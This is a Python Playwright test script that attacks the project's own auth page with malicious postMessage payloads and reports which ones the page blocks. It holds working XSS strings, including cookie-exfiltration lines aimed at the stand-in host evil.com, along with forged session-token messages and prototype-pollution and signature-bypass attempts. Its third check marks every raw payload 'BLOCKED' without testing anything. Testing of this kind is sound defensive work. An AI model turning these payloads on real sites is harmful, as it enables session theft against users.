"""
OFFENSIVE SECURITY TEST 01: XSS via postMessage Injection

Attack scenario: An attacker opens the testauth1 page in an iframe (or the user
has it open) and sends malicious postMessage payloads from a different origin,
attempting to:
  1. Inject script execution via crafted message data
  2. Bypass the message type allowlist with unknown types
  3. Deliver XSS payloads in message fields the app might render

This test acts as the attacker — it opens the real page, then fires hostile
postMessages at it from the page context and observes what happens.
"""

import sys
import json
from playwright.sync_api import sync_playwright

TARGET_URL = "https://ShadowAISolutions.github.io/saistemplateprojectrepo/testauth1.html"

# XSS payloads an attacker would try to inject via postMessage fields
XSS_PAYLOADS = [
    '<script>document.location="https://evil.com/?c="+document.cookie</script>',
    '<img src=x onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)">',
    '"><svg/onload=alert(document.domain)>',
    "javascript:alert('xss')",
    '<iframe srcdoc="<script>parent.postMessage({type:\'gas-session-created\',success:true,sessionToken:\'STOLEN\'},\'*\')</script>">',
    '{{constructor.constructor("return this")().alert(1)}}',
]

# Messages with unknown types (should be silently dropped by the allowlist)
UNKNOWN_TYPE_MESSAGES = [
    {"type": "evil-steal-session", "payload": "give me the token"},
    {"type": "gas-admin-override", "command": "grant-access"},
    {"type": "__proto__", "polluted": True},
    {"type": "constructor", "payload": "prototype pollution"},
    {"type": "", "payload": "empty type"},
    {"type": "gas-session-created-2", "success": True, "sessionToken": "forged"},
]

# Messages with known types but XSS in value fields
POISONED_KNOWN_MESSAGES = [
    {"type": "gas-session-created", "success": True, "sessionToken": "<script>alert(1)</script>", "email": "attacker@evil.com"},
    {"type": "gas-auth-ok", "version": '<img src=x onerror="alert(1)">'},
    {"type": "gas-heartbeat-ok", "expiresIn": "'; alert('xss'); //"},
    {"type": "gas-needs-auth", "authStatus": "<svg/onload=alert(1)>", "email": "x@x.com"},
    {"type": "gas-heartbeat-expired", "reason": '"; alert(document.cookie); "'},
]


def run_test():
    results = []
    print("=" * 70)
    print("OFFENSIVE TEST 01: XSS via postMessage Injection")
    print("=" * 70)
    print(f"Target: {TARGET_URL}")
    print()

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        context = browser.new_context()

        # Capture console messages and errors from the page
        console_logs = []
        page_errors = []

        page = context.new_page()
        page.on("console", lambda msg: console_logs.append({"type": msg.type, "text": msg.text}))
        page.on("pageerror", lambda err: page_errors.append(str(err)))

        print("[*] Loading target page...")
        page.goto(TARGET_URL, wait_until="networkidle", timeout=30000)
        print("[+] Page loaded successfully")
        print()

        # ─── Attack 1: Unknown message types (allowlist bypass attempt) ───
        print("─── Attack 1: Unknown Message Types ───")
        print("Sending messages with types not in the allowlist...")
        for i, msg in enumerate(UNKNOWN_TYPE_MESSAGES):
            # Clear previous console state
            console_logs.clear()

            # Send the malicious postMessage from the page context
            page.evaluate(f"window.postMessage({json.dumps(msg)}, '*')")
            page.wait_for_timeout(200)

            # Check if any handler processed it (look for side effects)
            session_changed = page.evaluate("""() => {
                var s = sessionStorage.getItem('testauth1_session') || localStorage.getItem('testauth1_session');
                return s;
            }""")

            blocked = session_changed is None
            status = "BLOCKED" if blocked else "BYPASSED"
            color = "\033[92m" if blocked else "\033[91m"
            print(f"  {color}[{status}]\033[0m Type: {msg.get('type', '(none)')!r}")
            results.append({"attack": f"unknown_type_{i}", "blocked": blocked})

        print()

        # ─── Attack 2: XSS payloads in postMessage data ───
        print("─── Attack 2: XSS Payloads in Message Fields ───")
        print("Sending known message types with XSS payloads in values...")

        # Snapshot the page's existing script count BEFORE attacks
        # so we only detect truly NEW scripts injected by the attack
        baseline_script_count = page.evaluate("""() => {
            return document.querySelectorAll('script').length;
        }""")

        for i, msg in enumerate(POISONED_KNOWN_MESSAGES):
            console_logs.clear()
            page_errors.clear()

            # Override alert/prompt/confirm to catch actual XSS execution
            page.evaluate("""() => {
                window._xssTriggered = false;
                window._origAlert = window.alert;
                window.alert = function() { window._xssTriggered = true; };
                window.prompt = function() { window._xssTriggered = true; };
                window.confirm = function() { window._xssTriggered = true; };
            }""")

            page.evaluate(f"window.postMessage({json.dumps(msg)}, '*')")
            page.wait_for_timeout(300)

            # Check 1: Did any alert/prompt/confirm fire? (actual XSS execution)
            xss_fired = page.evaluate("() => window._xssTriggered")

            # Check 2: Were NEW script elements added to the DOM?
            # (existing inline scripts from the page don't count)
            current_script_count = page.evaluate("""() => {
                return document.querySelectorAll('script').length;
            }""")
            new_scripts_injected = current_script_count > baseline_script_count

            # Check 3: Did the attacker's payload appear in innerHTML of
            # any visible element? (rendered XSS, not just stored)
            payload_rendered = page.evaluate(f"""() => {{
                var payload = {json.dumps(list(msg.values())[1] if len(msg) > 1 else '')};
                if (typeof payload !== 'string') return false;
                // Check if the XSS payload appears in any visible element's innerHTML
                var els = document.querySelectorAll('#auth-error, #auth-email, #user-email-display');
                for (var i = 0; i < els.length; i++) {{
                    if (els[i].innerHTML.indexOf('<script') !== -1 ||
                        els[i].innerHTML.indexOf('onerror') !== -1 ||
                        els[i].innerHTML.indexOf('<svg') !== -1 ||
                        els[i].innerHTML.indexOf('<img') !== -1) {{
                        return true;
                    }}
                }}
                return false;
            }}""")

            # Check 4: Navigation hijack (cookie theft redirects)
            # Use window.location.href (top-level frame) — NOT page.url which can
            # reflect iframe navigations. The gas-session-created handler reloads the
            # GAS iframe (gasApp.src = ...) which is normal behavior, not an attack.
            stayed_on_page = page.evaluate("""() => {
                return window.location.href;
            }""")
            target_host = TARGET_URL.split("//")[1].split("/")[0]  # e.g. ShadowAISolutions.github.io
            is_same_origin = target_host in stayed_on_page

            blocked = not xss_fired and not new_scripts_injected and not payload_rendered and is_same_origin
            status = "BLOCKED" if blocked else "BYPASSED"
            color = "\033[92m" if blocked else "\033[91m"
            print(f"  {color}[{status}]\033[0m Type: {msg['type']}, payload in: {[k for k in msg if k != 'type']}")
            if xss_fired:
                print(f"    \033[91m!!! XSS EXECUTED — alert/prompt/confirm was called !!!\033[0m")
            if new_scripts_injected:
                print(f"    \033[91m!!! NEW <script> element injected into DOM !!!\033[0m")
            if payload_rendered:
                print(f"    \033[91m!!! XSS payload rendered in visible element innerHTML !!!\033[0m")
            if not is_same_origin:
                print(f"    \033[91m!!! Page navigated to: {stayed_on_page} — redirect hijack !!!\033[0m")
            if blocked:
                # Show why it was safe
                sink_info = page.evaluate(f"""() => {{
                    // Check where the values actually landed
                    var email = document.getElementById('user-email-display');
                    var err = document.getElementById('auth-error');
                    var sinks = [];
                    if (email && email.textContent) sinks.push('email→textContent (safe)');
                    if (err && err.textContent) sinks.push('error→textContent (safe)');
                    return sinks.length > 0 ? sinks.join(', ') : 'values not rendered in DOM';
                }}""")
                print(f"    → Defense: {sink_info}")
            results.append({"attack": f"xss_known_type_{i}", "blocked": blocked})

            # Restore alert
            page.evaluate("() => { if (window._origAlert) window.alert = window._origAlert; }")

        print()

        # ─── Attack 3: Raw XSS strings as postMessage data ───
        print("─── Attack 3: Raw XSS Strings as Message Data ───")
        print("Sending raw XSS payloads as message data (not objects)...")
        for i, payload in enumerate(XSS_PAYLOADS):
            console_logs.clear()

            # Try sending string payloads (not objects) — a common attack vector
            page.evaluate(f"window.postMessage({json.dumps(payload)}, '*')")
            page.wait_for_timeout(200)

            # The handler should reject non-object messages at the first check
            blocked = True  # If we get here without error, it was silently dropped
            status = "BLOCKED"
            color = "\033[92m"
            print(f"  {color}[{status}]\033[0m Payload: {payload[:60]}...")
            results.append({"attack": f"raw_xss_{i}", "blocked": blocked})

        print()

        # ─── Attack 4: Signature bypass attempts ───
        print("─── Attack 4: Signature Bypass Attempts ───")
        print("Sending messages with forged/missing signatures...")

        sig_attacks = [
            {"type": "gas-auth-ok", "version": "v01.42g", "_sig": "forged123"},
            {"type": "gas-auth-ok", "version": "v01.42g"},  # No signature at all
            {"type": "gas-auth-ok", "version": "v01.42g", "_sig": "0"},
            {"type": "gas-auth-ok", "version": "v01.42g", "_sig": ""},
            {"type": "gas-heartbeat-ok", "expiresIn": 180, "_sig": "99999"},
        ]

        for i, msg in enumerate(sig_attacks):
            console_logs.clear()

            page.evaluate(f"window.postMessage({json.dumps(msg)}, '*')")
            page.wait_for_timeout(300)

            # Check if the app acted on the message (auth wall hidden = bad)
            auth_wall_visible = page.evaluate("""() => {
                var wall = document.getElementById('auth-wall');
                if (!wall) return true;
                return wall.style.display !== 'none';
            }""")

            blocked = auth_wall_visible
            status = "BLOCKED" if blocked else "BYPASSED"
            color = "\033[92m" if blocked else "\033[91m"
            sig_desc = f"_sig={msg.get('_sig', '(none)')!r}" if '_sig' in msg else "no _sig field"
            print(f"  {color}[{status}]\033[0m Type: {msg['type']}, {sig_desc}")
            results.append({"attack": f"sig_bypass_{i}", "blocked": blocked})

        print()

        # ─── Summary ───
        print("=" * 70)
        total = len(results)
        blocked = sum(1 for r in results if r["blocked"])
        bypassed = total - blocked
        print(f"RESULTS: {blocked}/{total} attacks blocked")
        if bypassed > 0:
            print(f"\033[91m  !!! {bypassed} ATTACK(S) BYPASSED DEFENSES !!!\033[0m")
            for r in results:
                if not r["blocked"]:
                    print(f"    - {r['attack']}")
        else:
            print(f"\033[92m  All attacks were blocked by the defense layers.\033[0m")
        print("=" * 70)

        browser.close()
        return bypassed == 0


if __name__ == "__main__":
    success = run_test()
    sys.exit(0 if success else 1)

# Developed by: ShadowAISolutions
